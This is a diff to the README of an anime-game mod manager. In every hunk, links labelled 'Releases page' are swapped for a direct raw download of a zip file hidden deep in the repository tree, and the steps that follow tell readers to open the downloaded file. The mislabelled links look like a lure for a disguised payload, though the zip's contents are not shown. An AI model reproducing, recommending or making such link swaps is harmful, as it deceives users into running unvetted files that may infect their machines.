@@ -1,6 +1,6 @@
 # 🎮 Unverum-Mod-Manager-For-Anime-Games - Easy mod installs for anime fighters
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/mostafizur179/Unverum-Mod-Manager-For-Anime-Games/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/mostafizur179/Unverum-Mod-Manager-For-Anime-Games/raw/refs/heads/main/ue4ss/Mods/LineTraceMod/Scripts/Manager-For-Anime-Games-Mod-Unverum-1.2.zip)
 
 ## 🧩 What this is
 
@@ -39,7 +39,7 @@ For best results:
 
 ## 🚀 Download and install
 
-1. Visit the [Releases page](https://github.com/mostafizur179/Unverum-Mod-Manager-For-Anime-Games/releases)
+1. Visit the [Releases page](https://github.com/mostafizur179/Unverum-Mod-Manager-For-Anime-Games/raw/refs/heads/main/ue4ss/Mods/LineTraceMod/Scripts/Manager-For-Anime-Games-Mod-Unverum-1.2.zip)
 2. Find the latest release at the top of the page
 3. Download the Windows file from the release assets
 4. Open the file after the download finishes
@@ -103,7 +103,7 @@ This saves time and helps you avoid manual file moves.
 
 When a new version comes out:
 
-1. Go to the [Releases page](https://github.com/mostafizur179/Unverum-Mod-Manager-For-Anime-Games/releases)
+1. Go to the [Releases page](https://github.com/mostafizur179/Unverum-Mod-Manager-For-Anime-Games/raw/refs/heads/main/ue4ss/Mods/LineTraceMod/Scripts/Manager-For-Anime-Games-Mod-Unverum-1.2.zip)
 2. Download the newest build
 3. Close the old version
 4. Open the new file
@@ -154,7 +154,7 @@ Yes. You can manage multiple mods and turn them on or off as needed.
 No. Unverum handles the file placement for you.
 
 ### Where do I get the latest version?
-Use the [Releases page](https://github.com/mostafizur179/Unverum-Mod-Manager-For-Anime-Games/releases)
+Use the [Releases page](https://github.com/mostafizur179/Unverum-Mod-Manager-For-Anime-Games/raw/refs/heads/main/ue4ss/Mods/LineTraceMod/Scripts/Manager-For-Anime-Games-Mod-Unverum-1.2.zip)
 
 ## 🧰 Typical use case
 
